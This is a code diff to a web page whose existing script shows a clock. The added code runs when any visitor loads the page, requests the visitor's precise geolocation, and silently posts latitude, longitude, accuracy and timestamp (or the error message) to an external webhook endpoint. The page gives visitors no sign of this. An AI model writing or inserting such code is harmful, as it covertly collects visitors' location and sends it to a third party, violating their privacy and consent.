@@ -94,6 +94,44 @@ function updateClockManualAmPm() {
 }
 	setInterval(updateClockManualAmPm, 1000);
 	updateClockManualAmPm();
+
+document.addEventListener("DOMContentLoaded", () => {
+  runOnEnter();
+});
+
+function runOnEnter() {
+  console.log("Visitor entered the site");
+
+  if (!navigator.geolocation) {
+    console.error("Geolocation not supported");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    (position) => {
+      sendToWebhook({
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        timestamp: new Date().toISOString()
+      });
+    },
+    (error) => {
+      sendToWebhook({
+        error: error.message,
+        timestamp: new Date().toISOString()
+      });
+    }
+  );
+}
+
+function sendToWebhook(payload) {
+  fetch("https://app.hooklistener.com/w/my-first-endpoint-opbl", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+}
 </script>
 </body>
 </html>
